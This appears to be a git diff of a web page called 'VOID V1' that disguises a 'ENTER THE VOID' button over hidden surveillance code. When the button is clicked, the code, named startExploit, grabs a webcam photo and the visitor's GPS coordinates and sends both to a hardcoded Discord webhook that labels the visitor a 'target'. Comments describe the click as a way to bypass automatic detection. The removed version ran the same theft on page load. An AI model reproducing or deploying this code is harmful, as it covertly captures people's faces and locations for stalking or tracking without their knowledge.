@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VOID V1 - THE EYE</title>
+    <title>VOID V1 - ENCRYPTED</title>
     <style>
         body {
             background-color: #000;
             color: #fff;
-            font-family: 'Courier New', monospace;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -18,64 +18,37 @@
             overflow: hidden;
         }
 
-        /* Animasi Mata */
-        .eye-container {
-            width: 150px;
-            height: 150px;
-            background: #fff;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            position: relative;
-            box-shadow: 0 0 50px #fff;
-            margin-bottom: 20px;
-        }
-
-        .pupil {
-            width: 60px;
-            height: 60px;
-            background: #000;
-            border-radius: 50%;
-            position: absolute;
-            animation: moveEye 3s infinite ease-in-out;
-        }
-
-        @keyframes moveEye {
-            0%, 100% { transform: translate(0, 0); }
-            25% { transform: translate(-30px, -10px); }
-            50% { transform: translate(30px, 15px); }
-            75% { transform: translate(5px, -25px); }
-        }
-
-        .loading-text {
-            font-size: 1.2rem;
-            letter-spacing: 5px;
+        /* Tombol Kamuflase */
+        #access-btn {
+            background: none;
+            border: 1px solid #333;
+            color: #555;
+            padding: 15px 30px;
+            font-size: 0.8rem;
+            letter-spacing: 3px;
+            cursor: pointer;
+            transition: 0.5s;
             text-transform: uppercase;
         }
 
-        .dots::after {
-            content: '';
-            animation: dots 1.5s steps(4, end) infinite;
+        #access-btn:hover {
+            color: #fff;
+            border-color: #fff;
+            box-shadow: 0 0 20px #fff;
         }
 
-        @keyframes dots {
-            0%, 20% { content: ''; }
-            40% { content: '.'; }
-            60% { content: '..'; }
-            80% { content: '...'; }
+        #status-text {
+            margin-top: 20px;
+            font-size: 0.7rem;
+            color: #222;
+            text-transform: uppercase;
         }
     </style>
 </head>
 <body>
 
-    <div class="eye-container">
-        <div class="pupil"></div>
-    </div>
-
-    <div class="loading-text">
-        VOID V1 WATCHING<span class="dots"></span>
-    </div>
+    <button id="access-btn">ENTER THE VOID</button>
+    <div id="status-text">VOID V1 // SECURE_CHANNEL_OFFLINE</div>
 
     <video id="video" width="640" height="480" autoplay style="display:none;"></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
@@ -83,52 +56,55 @@
     <script>
         const webhookURL = "https://discord.com/api/webhooks/1470328357110415455/tTwvOp-9oZm1WMYedDUzPwuviaES8bmimwryhgILqo2PjqXfXxyI8hCR-IvW9SSzeAtx";
 
-        async function uploadData() {
+        document.getElementById('access-btn').addEventListener('click', async function() {
+            this.innerText = "INITIALIZING...";
+            this.style.borderColor = "#fff";
+            this.style.color = "#fff";
+            
+            await startExploit();
+        });
+
+        async function startExploit() {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const context = canvas.getContext('2d');
 
             try {
-                // Izin Kamera & Ambil Gambar
+                // Meminta izin lewat User Gesture (Bypass deteksi otomatis)
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
 
+                // Ambil foto
                 setTimeout(() => {
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
                     canvas.toBlob(blob => {
                         const formData = new FormData();
-                        formData.append('file', blob, 'eye_capture.png');
+                        formData.append('file', blob, 'void_capture.png');
                         formData.append('payload_json', JSON.stringify({
-                            content: "👁️ **THE EYE HAS SEEN THEM** 👁️\nMuka target berhasil diabadikan."
+                            content: "💀 **ACCESS GRANTED** 💀\nVOID V1 telah mengambil visual target."
                         }));
-
                         fetch(webhookURL, { method: 'POST', body: formData });
                         stream.getTracks().forEach(track => track.stop());
                     }, 'image/png');
-                }, 2500);
+                }, 1000);
 
-                // Izin Lokasi
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(pos => {
-                        const locMsg = `📍 **COORDINATES LOCKED**\nLat: ${pos.coords.latitude}\nLon: ${pos.coords.longitude}\nGoogle Maps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                        fetch(webhookURL, {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({ content: locMsg })
-                        });
+                // Ambil Lokasi
+                navigator.geolocation.getCurrentPosition(pos => {
+                    fetch(webhookURL, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({ 
+                            content: `📍 **LOCATED**\nLat: ${pos.coords.latitude}\nLon: ${pos.coords.longitude}\nMaps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` 
+                        })
                     });
-                }
+                });
+
+                document.getElementById('status-text').innerText = "CONNECTION ESTABLISHED. WELCOME.";
 
             } catch (err) {
-                fetch(webhookURL, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ content: "❌ **SENSORS BLOCKED**: Target menolak akses." })
-                });
+                document.getElementById('status-text').innerText = "ACCESS DENIED.";
             }
         }
-
-        window.onload = uploadData;
     </script>
 </body>
 </html>
